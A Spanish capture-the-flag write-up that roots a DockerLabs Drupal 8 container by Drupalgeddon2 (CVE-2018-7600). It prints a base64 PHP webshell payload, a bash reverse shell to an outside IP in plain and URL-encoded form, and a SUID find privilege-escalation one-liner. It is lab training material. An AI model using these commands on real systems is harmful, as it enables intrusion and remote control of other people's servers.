# Writeup – Ejotapete (DockerLabs)

**Plataforma:** DockerLabs  
**Sistema:** Debian (Docker)  
**IP:** 172.17.0.2  
**Objetivo:** Obtener flag de root  

---

## 1. Reconocimiento

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG all_ports.txt
```

Solo el puerto **80/tcp** (Apache 2.4.25, Debian).

```bash
nmap -p80 -sCV 172.17.0.2 -oN tcp_scan.txt
```

---

## 2. Enumeración Web

Se utiliza `gobuster` para descubrir directorios en el servidor web.

Primero sobre la raíz:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php
```

Se encuentra `/drupal`. Se enumeran sus rutas:

```bash
gobuster dir -u http://172.17.0.2/drupal/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php
```

Se identifican directorios de interés como `user`, `admin`, `contact`, `node`, `sites/`, `modules/`, `themes/`, `core/`, y el fichero `install.php`.

Se confirma la versión de Drupal desde el meta tag:

```bash
curl -s http://172.17.0.2/drupal/ | grep Drupal
```
```
<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
```

Y se obtiene información adicional con `whatweb`:

```bash
whatweb http://172.17.0.2/drupal/
```
```
http://172.17.0.2/drupal/ [200 OK] Apache[2.4.25], Drupal, HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[172.17.0.2], MetaGenerator[Drupal 8], PHP[7.2.3], Title[Welcome to Find your own Style | Find your own Style]
```

---

## 3. Explotación – Drupalgeddon2 (CVE-2018-7600)

Se buscan exploits para Drupal 8 con `searchsploit` y se elige **Drupalgeddon2** (`44448.py`):

```bash
searchsploit drupal 8
```

Se copia el exploit:

```bash
searchsploit -p 44448
cp /usr/share/exploitdb/exploits/php/webapps/44448.py drupalgeddon2.py
```

El cambio indispensable es el **payload** en `mail[#markup]`:

**Original (solo prueba):**
```
echo ";-)" | tee hello.txt
```

**Modificado (webshell):**
```
echo "PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pgo=" | base64 -d | tee pwn.php
```

Esto decodifica `<?php system($_GET[1]);?>` y lo escribe como `pwn.php`.

Los otros cambios (argumento CLI y nombre del archivo de verificación) son meramente adaptativos.

```bash
python3 drupalgeddon2.py http://172.17.0.2/drupal/
```

Verificación de RCE:

```bash
curl -s "http://172.17.0.2/drupal/pwn.php?1=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 4. Reverse Shell

Se usa la RCE para enviar una reverse shell. El payload original es:

```bash
bash -c "bash -i >& /dev/tcp/192.168.1.134/4444 0>&1"
```

Se URL-encodea con **Burp Suite Decoder** para evitar problemas con caracteres especiales en la URL. El payload final encodeado es:

```
%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%31%33%34%2f%34%34%34%34%20%30%3e%26%31%22
```

```bash
curl "http://172.17.0.2/drupal/pwn.php?1=%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%31%33%34%2f%34%34%34%34%20%30%3e%26%31%22"
```

Se obtiene una sesión como el usuario **www-data**. Una vez dentro, se hace el tratamiento de la TTY:

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash
```

---

## 5. Escalada de Privilegios

Se listan binarios SUID:

```bash
find / -perm -4000 2>/dev/null
```

Se observa que `/usr/bin/find` tiene SUID. Se ejecuta:

```bash
find . -exec /bin/sh \; -quit
```

Se obtiene una shell como **root**.

---

## 6. Flag

```bash
cat /root/secretitomaximo.txt
```

```
<REDACTED>
```

---

## Resumen Técnico

| Fase | Herramienta / Técnica | Resultado |
|------|----------------------|-----------|
| Recon | nmap | Puerto 80 (Apache/Debian) |
| Web enum | gobuster | `/drupal` – Drupal 8 |
| Exploit | Drupalgeddon2 (CVE-2018-7600) | RCE como www-data |
| Shell | Reverse shell vía bash | Acceso interactivo |
| PrivEsc | SUID `find` → `-exec /bin/sh` | Shell como root |
| Flag | `secretitomaximo.txt` | `<REDACTED>` |
